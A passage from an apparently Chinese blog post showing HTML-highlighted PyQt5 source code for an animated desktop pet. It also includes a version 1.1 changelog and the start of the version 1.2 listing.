class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;33&#x27;</span>], <span class="comment"># 打喷嚏_11</span></span><br><span class="line">        [<span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;46&#x27;</span>], <span class="comment"># 杂项_12</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i: ACTION_DISTRIBUTION&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    stat = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        <span class="comment"># 初始化</span></span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        <span class="comment"># 随机导入一个宠物</span></span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        <span class="comment"># 设置退出选项</span></span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quit)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        <span class="comment"># 当前显示的图片</span></span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 是否跟随鼠标</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 宠物拖拽时避免鼠标直接跳到左上角</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        <span class="comment"># 显示</span></span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.InitTimer()</span><br><span class="line">        self.show()</span><br><span class="line">        <span class="comment"># 宠物动画动作执行所需的一些变量</span></span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;初始化计时器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InitTimer</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(self.randomAct)</span><br><span class="line">        self.timer.start(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.key = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(DesktopPet.stat)-<span class="number">1</span>)</span><br><span class="line">            self.action = DesktopPet.stat[self.key]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span>+<span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> self.heading == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Right&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.heading == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Left&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">            self.moving(self.heading)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame(self.heading)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self,heading</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.8</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> heading==<span class="number">1</span>:</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer].mirrored(heading, <span class="literal">False</span>))</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> heading==<span class="number">0</span>:</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer])</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moving</span>(<span class="params">self,heading</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">1.5</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            x = self.pos().x()</span><br><span class="line">            x += <span class="built_in">int</span>(<span class="number">32</span> * (<span class="number">0.5</span> - heading))</span><br><span class="line">            <span class="keyword">if</span> (heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((x &lt;= <span class="number">0</span> <span class="keyword">and</span> heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> heading == <span class="number">1</span>)):</span><br><span class="line">                    self.RandomAction(hit_wall=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((x &lt;= <span class="number">0</span> <span class="keyword">and</span> heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> heading == <span class="number">1</span>)):</span><br><span class="line">                    self.RandomAction(hit_wall=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">1</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            patch = [self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action]</span><br><span class="line">            pet_images.append(patch)</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shimemove1.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左键按下时, 宠物将和鼠标位置绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quit</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v1.1</li>
<li>date：2022.4.12</li>
<li>type：<ul>
<li>Features：<ul>
<li>大大提升了动作的流畅性</li>
<li>在执行“move”动作时，角色会真正的进行移动</li>
<li>角色现在可以改变面向的方向</li>
</ul>
</li>
<li>Changed：<ul>
<li>对程序的部分逻辑进行了修改</li>
<li>修复了多次点击不出图片的BUG</li>
</ul>
</li>
<li>Removed：<ul>
<li>削减了一些多余的动作</li>
</ul>
</li>
</ul>
</li>
<li>desc：<ul>
<li>第二代版本，功能大大增强</li>
<li>但还有一些BUG（当角色move到桌面外时，程序会强制关闭，目前不知道怎么解决）</li>
</ul>
</li>
</ul>
<h2 id="DesktopPets-v1-2"><a href="#DesktopPets-v1-2" class="headerlink" title="DesktopPets_v1.2"></a>DesktopPets_v1.2</h2><p>第三代版本，功能较为完善了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtWidgets, QtGui</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;x&#x27;</span>], <span class="comment"># 吃撇_0</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 眨眼_1</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 行走_2</span></span><br><span class="line">        [<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>], <span class="comment"># 拖动_3</span></span><br><span class="line">        [<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11&#x27;</span>], <span class="comment"># 打哈切_4</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬_5</span></span><br><span class="line">        [<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>], <span class="comment"># 触地_6</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉_7</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;22a&#x27;</span>], <span class="comment"># 飞_8</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23b&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>], <span class="comment"># 举手_9</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>, <span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 攻击_10</span></span><br><span class="line">        [<span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;33&#x27;</span>], <span class="comment"># 打喷嚏_11</span></span><br><span class="line">        [<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 撞墙_12</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span 